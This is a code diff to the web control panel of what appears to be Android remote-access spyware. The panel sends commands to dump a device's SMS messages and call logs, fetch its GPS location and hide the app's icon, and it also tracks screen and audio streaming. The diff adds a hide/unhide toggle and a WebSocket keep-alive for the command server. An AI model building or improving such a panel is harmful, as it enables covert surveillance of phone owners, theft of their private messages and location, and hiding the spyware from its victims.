@@ -118,7 +118,7 @@
         <button class="act" onclick="runCmd('get_sms', {limit: 50})">Dump SMS</button>
         <button class="act" onclick="runCmd('get_calllogs', {limit: 50})">Dump Calls</button>
         <button class="act" onclick="runCmd('get_location')">GPS Location</button>
-        <button class="act danger" onclick="runCmd('hide_icon')">Hide Icon</button>
+        <button class="act danger" id="btn-hide" onclick="toggleHide()">Hide Icon</button>
       </div>
       <pre id="extract-out">Awaiting command...</pre>
     </div>
@@ -175,7 +175,9 @@ window.onerror = function(msg) {
 const $ = id => document.getElementById(id);
 let ws = null;
 let currentDevice = "";
-let realScreenW = 480, realScreenH = 800;
+let realScreenW = 1080, realScreenH = 1920;
+let isHidden = false;
+let pingInterval = null;
 
 function switchTab(tabId, btn) {
   document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
@@ -225,12 +227,21 @@ function openWs(server, psk) {
       $('status').textContent = 'Connected'; 
       $('connectBtn').textContent = 'Connected';
       ws.send(JSON.stringify({ role: 'dashboard', psk })); 
+      
+      // HEARTBEAT: Ping every 30s to prevent Render timeout
+      if (pingInterval) clearInterval(pingInterval);
+      pingInterval = setInterval(() => {
+          if (ws && ws.readyState === WebSocket.OPEN) {
+              ws.send(JSON.stringify({ type: 'ping' }));
+          }
+      }, 30000);
     };
     ws.onmessage = ev => { try { handlePush(JSON.parse(ev.data)); } catch (_) {} };
     ws.onclose = () => {
       $('led').className = 'dot'; 
       $('status').textContent = 'Reconnecting...';
       $('connectBtn').textContent = 'Reconnect';
+      if (pingInterval) clearInterval(pingInterval);
       const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
       if (p && s) setTimeout(() => openWs(s, p), 3000);
     };
@@ -245,13 +256,10 @@ function handlePush(msg) {
   if (msg.type === 'device_list') {
     const sel = $('device-select');
     sel.innerHTML = '<option value="">Select Device</option>';
-    
-    // Handle both old (string) and new (object) server formats
     msg.devices.forEach(d => {
         if (typeof d === 'string') addDeviceOption(d, 'Device');
         else addDeviceOption(d.id, d.name);
     });
-    
     if (msg.devices.length > 0 && !currentDevice) {
         let firstId = typeof msg.devices[0] === 'string' ? msg.devices[0] : msg.devices[0].id;
         sel.value = firstId; onDeviceChange();
@@ -389,6 +397,20 @@ async function runCmd(cmd, args = {}) {
     const r = await api(cmd, args); 
     $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); 
   } catch (e) { alert(e.message); }
+}
+
+// Toggle Hide/Unhide
+async function toggleHide() {
+    try {
+        const cmd = isHidden ? 'unhide_icon' : 'hide_icon';
+        const r = await api(cmd);
+        if (r.ok) {
+            isHidden = !isHidden;
+            const btn = $('btn-hide');
+            btn.textContent = isHidden ? 'Unhide Icon' : 'Hide Icon';
+            btn.className = isHidden ? 'act success' : 'act danger';
+        } else alert(r.error);
+    } catch (e) { alert(e.message); }
 }
 
 let screenOn = false, audioOn = false;
